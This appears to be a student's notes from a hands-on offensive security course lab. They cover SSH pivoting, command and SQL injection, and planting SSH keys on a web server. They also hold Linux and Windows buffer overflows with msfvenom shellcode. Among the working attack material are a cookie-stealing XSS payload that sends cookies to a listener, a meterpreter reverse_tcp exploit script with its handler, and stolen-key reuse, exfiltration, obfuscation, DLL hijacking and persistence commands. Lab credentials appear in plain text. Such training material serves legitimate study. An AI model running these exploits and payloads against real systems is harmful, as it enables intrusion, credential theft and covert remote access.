1. Check notes.
2. Check FGs.
3. Ask google.
4. Ask instructor.

ssh demo1@10.50.14.253 -L1111:10.208.50.61:80
password
firefox -> 127.0.0.1:1111/classinfo

10.208.50.200/24
Stack nmber: 4
Username: JADU-019-M
Password: gXliXVXVuULy
scan this: 10.50.16.50 PublicFacingWebsite  (web server)

do NOT use your jump box today


10.50.16.50 
22, 53, 80
firefox--> 10.50.16.50

## Enumerate port 80 (reconaissance and scanning)
     linops$ nmap -Pn -T5 -sT -p 80 --script http-enum.nse 10.50.16.50
     went to an /login.html: possible admin folder. 
     ' OR 1='1  in username & password fields
     12 dev console, network tab
     Capture POST request payload via Network tab-->Request-->RAW slidebar. Copy the RAW Request payload.
     Add ? to URL and paste POST request raw payload
     in Decode String prompt i entered: ; cat /etc/password          (& decoded it from rot13)
     www-data:x:33:33:www-data:/var/www:/bin/sh           results show the home directory of www-data is /var/www

     linops$ nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse 10.50.16.50       (the sql injection was from /login.html, vulnerable field was username)
     linops$ nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse 10.50.16.50
     in Decode String prompt i entered: ; whoami          (i am www-data)

## After enumeration, upload your ssh key to gain access (web exploitation day 1)
     linops$ ssh-keygen -t rsa
     linops$ cat /home/student/.ssh/id_rsa
     in Decode String prompt i entered: ; ls -la /var/www      #check if .ssh exists
     in Decode String prompt i entered: ; mkdir /var/www/.ssh
     in Decode String prompt i entered: ; echo "your_public_key_here" >> /var/www/.ssh/authorized_keys
     in Decode String prompt i entered: ; cat /users/home/directory/.ssh/authorized_keys
     linops$ ssh www-data@10.50.16.50
     ip addr: 10.10.28.20/27
     www-data$ sudo -l (results show user www-data can run sudo on /var/tmp/exploit_me)

## Enumerate next tgt
     linops$ ssh www-data@10.50.16.50 -D 9050 2>/dev/null
     linops$ proxychains nmap -Pn -T4 192.168.28.175   (ports 2222(ssh), 8000)
     linops$ ssh www-data@10.50.16.50 -L10601:192.168.28.175:8000
     firefox --> 127.0.0.1:10601


     ## SQL Injection (web exploitation day) 2 GET Method vs Post Method
     ?product=1 OR 1=1         ##repeat until you find vulnerable url (in this case its ?product=7 OR 1=1  ...u can tell its vulnerable bc it shows more info than its supposed to)
     ?product=7 UNION SELECT 1,2,@@version        ##version is 10.1.48-MariaDB-0ubuntu0.18.04.1
     ?product=7 UNION SELECT table_schema,table_name,column_name from information_schema.columns         ##use golden statement. find non-default databases, tables, and columns of interest.

     (end of timer for day)

     Reminder: UNION SELECT column, column, column, FROM database.table

     ?product=7 UNION SELECT table_schema,table_name,column_name from information_schema.columns
     information.schema is the database

     database, columns, tables

     ?product=7 UNION SELECT  user_id,name,username from siteusers.users       THIS WORKED!! 

     1 	nccyrObggbzW3na$ 	$Aaron
     2 	GhexrlQnl24 	$user2
     3 	Obo4GURCva3nccyrf 	$user3
     4 	Lroth 	$Lee_Roth
     4 	nabgurecnffjbeq4GURntrf 	$Lroth

     convert from rot13 to ascii

     1 	Aaron	appleBottomJ3an$
     2 	user2 	TurkeyDay24
     3 	user3	Bob4THEPin3apples          THIS USER WORKS
     4 	Lee_Roth	Lroth
     4 	Lroth	anotherpassword4THEages

www-data$ bash (to drop into a shell)

## Enumerate next tgt
     www-data$ for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) 2>/dev/null ;done         (to ping sweep the entire network; results showed .1, .175 and .165)
     linops$ proxychains nmap -Pn -T4 192.168.28.165 (ports 22 & 8888 are open)
     exit out of -D 9050 
     linops$ ssh www-data@10.50.16.50 -L10603:192.168.28.165:8888 (no response)
     linops$ ssh www-data@10.50.16.50 -L10605:192.168.28.165:22
     linops$ ssh user3@localhost -p 10605 (user3: Bob4THEPin3apples)
     once you get on any new system, check:
     cat /etc/passwd 
     cat /etc/hosts

## Enumerate next tgt
     user3@RoundSensor$ for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) 2>/dev/null ;done          (run a pingsweep, results show another ip of 192.168.1.1)
     linops$ ssh user3@localhost -p 10605 -D 9050 2>/dev/null (user3: Bob4THEPin3apples)

     user3@RoundSensor$ find / -type f -perm /6000 -ls 2>/dev/null               (find all files with suid/sgid bit set)
     https://gtfobins.github.io/#find        search firefox for vulnerable cmds
     followed instructions to escalate privileges, then dropped into a bash shell, then ran a ping sweep: for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) 2>/dev/null ;done (results showed 192.168.28.189)
     linops$ proxychains nmap -Pn -T4 192.168.28.189     (results show open ports: 22, 135, 139, 445, 3389, 5357, 9999)
     linops$ ssh user3@localhost -p 10605 -L 10606:192.168.28.189:3389        (user3: Bob4THEPin3apples)    
     linops$ xfreerdp /u:Aaron /p:appleBottomJ3an$ /v:localhost:10606 /cert-ignore

## Buffer Overflow using gdb and env (reverse engineering)
DO IT ON THE TGT SYSTEM !!! ALL OF THIS MUST BE DONE ON THE FUCKING TGT SYSTEM !!!
     linops$ gdb exploit_me
     gdb-peda$ run
     go to wiremask generate a pattern with a length of 100
     gdb-peda$ r <long ass pattern>
     find where the EIP value is. it should be the same value as the last line where it says Stopped Reason: SIGSEGV 0x##### in ??(). input that value as the offset value in wiremask website.
     split screen, touch /tmp/exploit.py, chmod 777, then vi /tmp/exploit.py
     urmom = "A" * 55
     eip = "BBBB"
     nop = '\x90' * 5
     print(urmom+eip+nop)
     :w!
     gdb-peda$ run $(python exploit.py)           (if the arguement is immediately after the exe name, then dont use the <<<)
     gdb-peda$ exit. then linops$ env - gdb <exploit_name>
     (gdb) show env
     (gdb) unset env LINES
     (gdb) unset env COLUMNS
     Now that we have the memory layout for this program we need to select a start and end to search through for a "jmp esp". In order to do that we take the start address after the heap and the end address before the stack.
     To search for "jmp esp" run the command: find /b 0xfirstmemaddrafterheap , 0xlastmemaddr, 0xff, 0xe4           The start and end address can be different based on the program and the system that program executes on. The 0xff and 0xef does not change
     This command should return a ton of memory addresses. Choose the 2nd or 3rd memory address and copy it into your exploit code. Remember that we are on a little endian cpu architecture, so hex for the memory address will have to be submitted in reverse.
     add that mem addr into exploit.py as the eip value
     linops$ msfvenom -p linux/x86/exec CMD=/bin/sh -b '\x00' -f python      this will take awhile & will generate a buffer. copy paste it to the end of the script. make sure the script is on the tgt machine. rn the script looks like.
          urmom = "A" * 55
     eip = "\xab\x48\xf6\xf7"
     nop = '\x90' * 32
     buf =  b""
     buf += b"\xba\xb8\x38\xee\xd4\xda\xd4\xd9\x74\x24\xf4\x58"
     buf += b"\x33\xc9\xb1\x0b\x31\x50\x15\x03\x50\x15\x83\xe8"
     buf += b"\xfc\xe2\x4d\x52\xe5\x8c\x34\xf1\x9f\x44\x6b\x95"
     buf += b"\xd6\x72\x1b\x76\x9a\x14\xdb\xe0\x73\x87\xb2\x9e"
     buf += b"\x02\xa4\x16\xb7\x1d\x2b\x96\x47\x31\x49\xff\x29"
     buf += b"\x62\xfe\x97\xb5\x2b\x53\xee\x57\x1e\xd3"

     print(urmom+eip+nop+buf)
     ~                                        
     on the tgt machine: sudo ./exploit_me $(python exploit.py)       then itll show a # if it worked & you can enter whoami & itll show root!!
          

## PEN TESTING AND VULN

  -> Advanced Scanning Techniques
  Host Discovery
  
  Find hosts that are online
  
  Port Enumeration
  
  Find ports for each host that is online
  
  Port Interrogation
  
  Find what service is running on each open/available port
  
  
SSH for Reconnaissance
Why? "Live off the land", route tools, reach internal services

Dynamic SOCKS (-D): Proxychains support (TCP only)

Local Forward (-L): Access internal services (web/SSH)

Remote Forward (-R): Expose local tools to target

ProxyJump (-J): Clean multi-hop navigation




Script Management
Scripts are stored in a subdirectory of the Nmap data directory by default:



/usr/share/nmap/scripts



Usage and Examples
!!! Note NSE scripts provide automated vulnerability detection and service enumeration capabilities

# Run specific script or category
nmap --script <filename>|<category>|<directory>

# Get help for specific scripts
nmap --script-help "ftp-* and discovery"

# Pass arguments to scripts
nmap --script-args <args>
nmap --script-args-file <filename>

# Get help for scripts
nmap --script-help <filename>|<category>|<directory>

# Enable script tracing for debugging
nmap --script-trace

master socket ssh -> every box create a new master socket
ssh -MS /tmp/jump demo1@10.50.12.21

proxychains
ssh -S /tmp/jump jump -O forward -D 9050

-> nmap for host discovery ip
for i in {1..255}; do (ping -c 1 10.50.12.$i | grep "bytes from" &); done

64 bytes from 10.50.12.22: 53
64 bytes from 10.50.12.23: 22, 53, 3389
64 bytes from 10.50.12.24: 22, 53, 3389


-> running a script wildcard* if you dont know which to use
nmap -p 53 --script dns* 10.50.12.22-24

to verify http 300s redirection 400s errors
nmap -p 80 --script http-enum 10.50.12.22-24

-> ping sweep
for i in {96..128}; do proxychains nc -nvzw1 192.168.NetID.$i 22 53 80 135 137 139 445 2>&1 | grep OK | grep -Eo "192.168.NetID.:[0-9]" ;done
for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) 2>/dev/null ;done
multiple port forward
ssh -S /tmp/jump jump -O forward -L 1111:10.50.12.21:22 -L 1112:10.50.12.21:80

cancel them
ssh -S /tmp/jump jump -O cancel -L 1111:10.50.12.21:22 -L 1112:10.50.12.21:80

to check to make sure connections is connected
ss -antlp


## WEB EXPLOIT

Run the following to chain/stack our arbitrary command

; cat /etc/passwd

# Check Tunnel
nc 127.0.0.1 42071

# Create Master Socket
ssh -MS /tmp/demo demo1@10.50.12.21 -nF 2>/dev/null
ssh -S /tmp/demo demo1@10.50.12.21

# Host Enumeration, Ping Sweep (from remote box)
for i in {1..255}; do (ping -c 1 10.208.50.$i | grep "bytes from" &); done

# Port Enumeration with dynamic and proxychains
ssh -S /tmp/demo demo -O forward -D 9050
ss -antlp | grep 9050 #sanity check, verify port opened
proxychains nmap 10.208.50.42

# Tunnel to...
10.208.50.42
22/tcp open ssh
ssh -S /tmp/demo demo -O forward -L 42070:10.208.50.42:80
ssh -MS /tmp/demo demo1@10.50.12.21 -nF 2>/dev/null

80/tcp open http
ssh -S /tmp/demo demo -O forward -L 42070:10.208.50.42:22
ssh -MS /tmp/t1 www-data@127.0.0.1 -p 42071 -fN 2>/dev/null
ssh -MS /tmp/t1 -i $HOME/.ssh/id_rsa www-data@127.0.0.1 -p 42071 -fN 2>/dev/null

# HTTP enumeration, We would add notes to pages we find
Check /robots.txt

proxychains nmap --script+http-enum 10.208.50.42 80
|    /robots.txt
|    /java/
|    /path/
|    /uploads/

# Directory Traversal takes advantage of READING files and using absolute path 
../../../../../../etc/passwd
../../../../../../etc/hosts

127.0.0.1:42070/path/pathdemo.php?myfile=../../../../../../etch/passwd

# CMD injection uses semi-colin to run commands (not an active shell cant cd)
; whoami


# JavaScript
Open inspector
find JS by looking for functions (
open console in inspector and run js manually, e.g. changetext()


# Steal Cookie
setup nc
nc -lvpk 10.50.187.52 42071 # Where you want to intercept cookie

post to chat....
<script>document.location="http://10.50.187.52:42071/?username=" + document.cookie;</script>

127.0.0.1:42070/uploads
# Malicious upload requires 1. Upload 2. Find uploads, 3. Call upload
touch 503.png.php
vim 503.png.php

#### SSH KEYGEN #### important af
Identify user and home directory using whoami and cat /etc/passwd

# Generate Our Key
## From Linops
ssh-keygen -t rsa -b 4096 # enter for default option
No passpharsse

cat /home/student/.ssh/id_rsa.pub

## On Target, make directory and verify
; mkdir /var/www/.ssh
; ls -la /var/www


## On Traget, upload key and verify
; echo "" > /var/www/.ssh/authorized_keys # Paste whole key into echo
; cat /var/www/.ssh/authorized_keys



## SQL INJECTION
Input to Inject:

1 or 1=1; #

Server-Side Query becomes:

SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;

Audi 'Union select 1,2,3,4,5 #'

'OR 1='1


1. Find vulnerable input & 'OR 1='1
Selection=3 or 1=1

2. Numbers of columns with numbers
Audi' UNION SELECT 1,2,3,4,5 FROM information_schema.tables #
Selection=3 UNION SELECT 1,2,3 #

3. Golden statement
Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #
Selection=2 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns; #

4. Audi' UNION SELECT tireid,2,size,cost,5

Selection=2 UNION SELECT null,name,color FROM car



1 	session 	user 	id
1 	session 	user 	name
1 	session 	user 	pass
1 	session 	userinfo 	studentID
1 	session 	userinfo 	username
1 	session 	userinfo 	passwd



Blind Injection
Inlcudes Statements to determine how DB is configured

Columns in Output

Can we return errors

Can we return expected Output

Used when unsanitized fields give generic error or no messages


Normal Query to pull expected output:

php?item=4


Blind injection for validation:

php?item=4 OR 1=1

Try ALL combinations! item=1, item=2, item=3, etc.



Abuse The Client (GET METHOD)
Passing injection through the URL:

After the .php?item=4 pass your UNION statement

prices.php?item=4 UNION SELECT 1,2

prices.php?item=4 UNION SELECT 1,2,@@version
What is @@version




Abuse The Client (Enum)
Identifying the schema leads to detailed queries to enumerate the DB


Research Database Schemas and what information they provide


php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()


## EXPLIOT DEVELOPEMENT
 ## Download func
2
3 ##Static Analysis
4 # strings func
5 # file func
6       ##Wants a String, is an ELF
7
8 ##Behavioral Analysis
9 # chmod u+x func
10 # run it ./func
11 ## Command Substitution (parameter):
12      #  ./func $(echo "12345")
13 ## USER INPUT:
14      # ./func <<<$(echo "12345") -> always test this
15 show functions

EIP is where i need to look for are next steps
Run the script then change the length to 100 on website
copy the pattern and put it in your script -> run script again
Take EIP hex value -> insert in website to find offset
update script to hold the new ofset value
use this website https://wiremask.eu/tools/buffer-overflow-pattern-generator/

#!/usr/bin/env python
offset = "A" * 62
EIP = "BBBB"

print(offset + EIP ) 
run <<<$(python myscript.py)

16 ## Dynamic Analysis
17  # -> Fuzzing trying to break
18      # ./func <<<$(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
19
20 # gdb ./func
21      #shell (gives shell)
22      #exit (gets back to gdb)
23      #info functions
24      #run (Ctrl + c to exit)
25      #info functions again (more output)
26 ##disassembly
27      #pdisass main
28      #pdisass <new function call>


# From a shell on target system
env - gdb ./func
show env
unset env LINES
unset env COLUMNS
"run" -> ctrl + c
info proc map
step  -> run this till you can see stack and heap
info proc map
find /b <first>, <last>, 0xff, 0xe4

grab a few jumps
big endian to little 
f7 de 3b 59 -> \x59\x3b\xde\xf7 -> insert into script in EIP
0xf7f588ab
0xf7f645fb
0xf7f6460f
0xf7f64aeb
Insert NOP = "\x90" * 15 -> update print statement
msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python  -> bad bytes dont change
copy buf -> insert to sript -> update print statement


offset = "A" * 62
EIP = "\x59\x3b\xde\xf7"
NOP = "\x90" * 15
buf =  b""
buf += b"\xba\x4c\xb2\x08\x9c\xd9\xc2\xd9\x74\x24\xf4\x5f"
buf += b"\x31\xc9\xb1\x0b\x31\x57\x14\x83\xc7\x04\x03\x57"
buf += b"\x10\xae\x47\x62\x97\x76\x31\x21\xc1\xee\x6c\xa5"
buf += b"\x84\x09\x06\x06\xe4\xbd\xd7\x30\x25\x5f\xb1\xae"
buf += b"\xb0\x7c\x13\xc7\xc4\x82\x94\x17\xbc\xea\xfb\x76"
buf += b"\x2f\x83\x03\x2e\xfc\xda\xe5\x1d\x82"

print(offset + EIP + NOP + buf)
run





Provided: Executable Package: inventory.exe
Task: Perform a local buffer overflow on the vulnerable Linux executable, in order to gain access to the desired intel.
Method: Utilize RE toolset and python to launch and develop exploit.

ASLR is disabled on the target machine.

Exploit this binary found on 192.168.28.111 at /.hidden/inventory.exe to escalate privileges from your pivot user to root.

Enter the contents of /.secret/.verysecret.pdb as the flag

Your flag will be a unique string of twenty random characters


0x f7 df 1b 51
0xf7f6674b
0xf7f72753
0xf7f72c6b
0xf7f72df7
0xf7f7307b

"TRUN /.:/"
"HELP"

+++++++++++++++++++Windows Buffer Overflow

1 #Static Analysis
2     strings.exe <filename>
3     GUI > Properties
4 #Behavioral Analysis
5     RUN IT <program> via gui or in terminal
6     netstat -anob <look for port>
7     get-process | findstr /i <string to lookup> ex. vuln, secure
8 #Dynamic Analysis
9     Run immunity debugger -> File then attached -> make sure program was running before starting
10    To unpause hit rewind -> then play -> make script on nix box
#!/usr/bin/python
import socket
buf = "HELP"
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create socket
s.connect(("10.50.136.106", 9999)) #connecting to TargetIP/Port
print s.recv(1024) # print response
s.send(buf) #sends value of buf
print s.recv(1024) #print response
s.close() #closes the socket

FUZZING
buf = "TRUN /.:/"
buf += "A" * 5000 
go to wiremask 5000 length -> insert in script comment out buf +=
run then get eip and insert to get offset vaule then insert 4 "BBBB"


#!/usr/bin/python
import socket
buf = "TRUN /.:/"
buf += "A" * 2003
buf += "BBBB"
#buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3$
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create socket
s.connect(("10.50.136.106", 9999)) #connecting to TargetIP/Port
print s.recv(1024) # print response
s.send(buf) #sends value of buf
print s.recv(1024) #print response
s.close() #closes the socket


11  !mona modules #searchs for bad module, look for falses accross the board
12  !mona jmp -r esp -m "essfunc.dll" -> windows log data
  Convert 
  0x 62 50 11 af ->  \xaf\x11\x50\x62
  0x 62 50 11 bb ->  \xbb\x11\x50\x62
  0x 62 50 11 c7 ->  \xc7\x11\x50\x62

JMP ESP -> buf += "\xaf\x11\x50\x62" # bottom left 

NOP SLED -> buf += "\x90" * 10
                                                                                                                         "BAD BYTES"
PAYLOAD -> run this to get payload:   msvenom -p windows/meterpreter/reverse_tcp lhost=10.50.139.158 lport=4444 -b "\x00\xfe\x20\x0a\xff" -f python
                                                                                                                         
            
#!/usr/bin/python
import socket
buf = "TRUN /.:/"
#FUZZ:
buf += "A" * 2003
#JMP ESP:
buf += "\xaf\x11\x50\x62"
#NOP SLED:
buf += "\x90" * 10

## PAYLOAD:

#msvenom -p windows/meterpreter/reverse_tcp lhost=10.50.139.158 lport=4444 -b "\x00\xfe\x20\x0a\xff" -f python
buf += b"\xbd\x14\x2d\xbf\x43\xda\xc7\xd9\x74\x24\xf4\x5b"
buf += b"\x33\xc9\xb1\x59\x31\x6b\x14\x83\xc3\x04\x03\x6b"
buf += b"\x10\xf6\xd8\x43\xab\x79\x22\xbc\x2c\xe5\xaa\x59"
buf += b"\x1d\x37\xc8\x2a\x0c\x87\x9a\x7f\xbd\x6c\xce\x6b"
buf += b"\xb2\xc5\xa5\xb5\xfd\xd6\xb1\xc8\xd5\x19\x06\x80"
buf += b"\x1a\x38\xfa\xdb\x4e\x9a\xc3\x13\x83\xdb\x04\xe2"
buf += b"\xe9\x34\xd8\x7e\x43\xda\x8a\x0b\x26\xe6\x35\xdc"
buf += b"\x2c\x56\x4e\x59\xf2\x22\xe2\x60\x23\x9a\x71\x2a"
buf += b"\xdb\x91\xde\x8b\xda\x76\x5b\x02\xa8\x44\x55\x6a"
buf += b"\x18\x3f\xa1\x1f\x9a\xe9\xfb\xdf\x31\xd4\x33\xd2"
buf += b"\x48\x11\xf3\x0d\x3f\x69\x07\xb3\x38\xaa\x75\x6f"
buf += b"\xcc\x2c\xdd\xe4\x76\x88\xdf\x29\xe0\x5b\xd3\x86"
buf += b"\x66\x03\xf0\x19\xaa\x38\x0c\x91\x4d\xee\x84\xe1"
buf += b"\x69\x2a\xcc\xb2\x10\x6b\xa8\x15\x2c\x6b\x14\xc9"
buf += b"\x88\xe0\xb7\x1c\xac\x09\x48\x21\xf0\x9d\x84\xec"
buf += b"\x0b\x5d\x83\x67\x7f\x6f\x0c\xdc\x17\xc3\xc5\xfa"
buf += b"\xe0\x52\xc1\xfc\x3f\xdc\x82\x02\xc0\x1c\x8a\xc0"
buf += b"\x94\x4c\xa4\xe1\x94\x07\x34\x0d\x41\xbd\x3e\x99"
buf += b"\x60\x73\xb4\xc7\x1d\x71\xca\xe6\x81\xfc\x2c\x58"
buf += b"\x6a\xae\xe0\x19\xda\x0e\x51\xf2\x30\x81\x8e\xe2"
buf += b"\x3a\x48\xa7\x89\xd4\x24\x9f\x25\x4c\x6d\x6b\xd7"
buf += b"\x91\xb8\x11\xd7\x1a\x48\xe5\x96\xea\x39\xf5\xcf"
buf += b"\x8c\xc1\x05\x10\x39\xc1\x6f\x14\xeb\x96\x07\x16"
buf += b"\xca\xd0\x87\xe9\x39\x63\xcf\x16\xbc\x55\xbb\x21"
buf += b"\x2a\xd9\xd3\x4d\xba\xd9\x23\x18\xd0\xd9\x4b\xfc"
buf += b"\x8c\xc1\x05\x10\x39\xc1\x6f\x14\xeb\x96\x07\x16"
buf += b"\xca\xd0\x87\xe9\x39\x63\xcf\x16\xbc\x55\xbb\x21"
buf += b"\x2a\xd9\xd3\x4d\xba\xd9\x23\x18\xd0\xd9\x4b\xfc"
buf += b"\x80\x8a\x6e\x03\x1d\xbf\x22\x96\x9e\xe9\x97\x31"
buf += b"\xf7\x17\xc1\x76\x58\xe8\x24\x05\x9f\x16\xba\x22"
buf += b"\x38\x7e\x44\x73\xb8\x7e\x2e\x73\xe8\x16\xa5\x5c"
buf += b"\x07\xd6\x46\x77\x40\x7e\xcc\x16\x22\x1f\xd1\x32"
buf += b"\xe2\x81\xd2\xb1\x3f\x32\xa8\xba\xc0\xb3\x4d\xd3"
buf += b"\xa4\xb4\x4d\xdb\xda\x89\x9b\xe2\xa8\xcc\x1f\x51"
buf += b"\xa2\x7b\x3d\xf0\x29\x83\x11\x02\x78"


#buf += "BBBB"
#buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3$
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create socket
s.connect(("10.50.136.106", 9999)) #connecting to TargetIP/Port
print s.recv(1024) # print response
s.send(buf) #sends value of buf
print s.recv(1024) #print response
s.close() #closes the socket

#SETUP MSFCONSOLE
'''
msfconsole
use multi/handler
show options
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit
'''


#go to msfconsole#
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit

reset immunity debugger
run script on linux


## POST EXPLIOT

#User Enumeration
Windows: -> net user

Linux: -> cat /etc/passwd

#Process Enumeration
Windows: -> tasklist /v

Linux: -> ps -elf

#Service Enumeration
Windows: -> tasklist /svc

Linux : -> chkconfig                   # SysV
        -> systemctl --type=service    # SystemD


#Network Connection Enumeration
Windows: -> ipconfig /all

Linux: -> ifconfig -a      # SysV (deprecated)
       -> ip a             # SystemD


#Stealing SSH Keys (Living off the Land)
Finding private keys (id_rsa) is like finding passwords.

Authorized Key (Public): Grants access TO this box.

Identity Key (Private): Authenticates FROM this box to others.

1. Fix permissions (crucial!)
chmod 600 stole_key

2. Authenticate using the stolen key
# Try the user who owned the key (e.g., stole from jane -> log in as jane)
ssh -i stolen_key jane@target_internal_ip


#Data Exfiltration
Session Transcript: -> ssh <user>@<host> | tee session.log

Obfuscation (Windows): -> type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
                       -> certutil -encode <file> encoded.b64

Obfuscation (Linux): -> cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
                     -> cat <file> | base64

Encrypted Transport: -> scp <source> <destination>
                     ->ncat --ssl <ip> <port> < <file>



HOST ENUMERATION LINUX

(Focus on information gathering for exploiting later)

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/?redirect


What are we trying to accomplish doing host enumeration?
    • Gathering information about the environment in order  to escalate privileges, gather more information about the network, learn the habits of an admin is he a baddie.. There was times during ops you had to actually fix their own network for them in order to complete a task

When checking directories remember to always use ls -la. You never know what can be hiding.



Linux Commands
date & time	        knowing date and time can help correlate logs and identify target's time zone 
whoami	            who we are logged in as
id		            permissions group ( do we have root permissions)
groups 	            see what groups we are in (are we in the sudoers)
sudo -l             do we have any binaries that execute with higher privs  
cat /etc/passwd	    user information
cat /etc/shadow     user information (need privileged access)
w                   who is logged in, terminal and what they are doing (tty are direct connections to the pc.. So pts are ssh or telnet connections)
last                information about users that logged in (user habits, might need to avoid times)
uptime              how long has the machine been up (would this make for a good pivot)
hostname            name of machine
uname -a            kernel information architecture
cat /etc/*rel*      OS version information


Networking Information

ip addr                 info about the network interfaces (IPs, subnets, etc.)
ifconfig -a             info about the network interfaces (IPs, subnets, etc.) (Depricated)
cat /etc/hosts          translates hostnames or domain names to ip addresses ( could see a name to another box, might point a target of interest Windows Server )
cat /etc/resolv.conf    configure dns name servers 
ss -antp                displays TCP socket information (listening ports and established connections along with process associated with the socket)(-p needs root privs)
netstat -antp           displays TCP socket information (listening ports and established connections along with process associated with the socket)(-p needs root privs)
netstat -anup           displays UDP socket information
netstat -rn             prints routing table
arp -an                 prints arp table


Process Information
ps -ef                                  prints all processes in full-format listing
ps -auxf 	                            prints all processes in and some other info in different format
lsof -p [pid] 	                        list of open files opened by the process identified by its pid
ls -al /proc/[pid]                      list directrory of a specific pid
service --status-all    	            shows all services and if they are running or not 
systemctl list-units --type=service     another way to list all services depending on type of linux system



Logging
cat /etc/rsyslog.conf   default rsyslog config file, check rules and for remote logging 
/etc/rsyslog.d 		    directory where config files are kept we want to check those also.
/var/log		        default location for linux system logs


Crontabs
Why might we want to check Crontabs? What could we take advantage of?
Crontabs are owned by respective users so you will not be able to see other users crontabs.
Multiple ways and places to look for cron jobs/scripts.
/var/spool/cron/crontabs
/etc/cron.d
ls -la /etc/cron*
cat /etc/cron*  crontab
sudo crontab -u student -l



Finding files and locations to check
find usaga examples:
find / -name password* 2>/dev/null      find any file starting with the word password 
find / -iname *test* 2>/dev/null        find any file with "test" somewhere in its name, ignoring capitalization
find / -type f -name *.txt              find all .txt files        
find / -type f -name ".*"               find all hidden files
find / -type d -name ".*"               find all hidden directories



/tmp		check tmp folders (world writable)
/home	 	check home folders for users
/etc        default location for config files



HOST ENUMERATION WINDOWS

General Information

Date /t
Time /t
Hostname
Whoami
systeminfo

User Information
Net user
Net localgroup
Net localgroup administrators
Net use ( if any shares are mapped)


Network Information
Ipconfig /all
Ipconfig /displaydns
Route print
Netstat -ant
Netstat -anob ( need to be admin)


Interesting Locations
Explorer - view - hidden items ( turn on show hidden items )
Check users documents,downloads,desktops
Dir c:\windows\prefetch ( admin ) = see what executables have been ran
Dir /a:h
dir /o:d /t:w c:\windows\system32
dir /o:d /t:w c:\windows\system32\winevt\logs
dir /o:d /t:w c:\windows\temp
reg query hklm\software\microsoft\windows\currentversion\run /s   (don’t forget about hkcu) and runonce


Process and Services 
Tasklist /v
Tasklist /svc
tasklist /svc | findstr /i "PID"

Services.msc ( gui )
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a
Sc query <service name>

Schtasks
Task sch ( gui )
schtasks /query /fo LIST /v
schtasks /query 






## WINDOWS EXPLIOT

#Windows Access Control Model
Access Tokens
-> Security Identifier (SID) associations and Token associations
Security Descriptors
-> DACL
   SACL
   ACEs


#DLL Search Order
Executables check the following locations (in successive order):
-> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs

####The directory the the Application was run from -> very important
The directory specified in in the C+ function GetSystemDirectory()
The directory specified in the C+ function GetWindowsDirectory()
The current directory

#Windows Integrity Mechanism
Integrity Levels

Untrusted
-> Anonymous SID access tokens

Low
-> Everyone SID access token (World)

Medium
-> Authenticated Users

High
-> Administrators

System
-> System services (LocalSystem, LocalService, NetworkService)


#User Account Control (UAC)
Always Notify
Notify me only when programs try to make changes to my computer
Notify me only when programs try to make changes to my computer (do not dim my desktop)
Never notify

#DEMO: Checking UAC Settings
-> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System

#AutoElevate Executables
Requested Execution Levels:
asInvoker
highestAvailable


#Scheduled Tasks & Services
Items to evaluate include:

Write Permissions
Non-Standard Locations
Unquoted Executable Paths
Vulnerabilities in Executables
Permissions to Run As SYSTEM

#DEMO: Finding vulnerable Scheduled Tasks
schtasks /query /fo LIST /v | findstr /i "system" or "Task To Run"

#DEMO: Finding Vulnerable Services
wmic service list full
sc query

DEMO: DLL Hijacking
Identify Vulnerability

Take advantage of the default search order for DLLs

NAME_NOT_FOUND present in executable’s system calls

Validate permissions

Create and transfer Malicious DLL

DEMO: Finding Vulnerable Services
wmic service list full
sc query

#DEMO: Vulnerable services
Identify Vulnerability
Validate permissions
Validate Executable Paths
Replace with Malicious File

(Get-Process | Where-Object -Property ProcessName -Like "putty*").kill()

#Persistance
-> System changes or binary uploads that provide the adversary continued access to system
Survives:
Reboots
Credential changes
DHCP IP reassignment
Etc.

Considerations include:
File naming
File location
Timestomping
Port selection


#Registry
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
Run
RunOnce

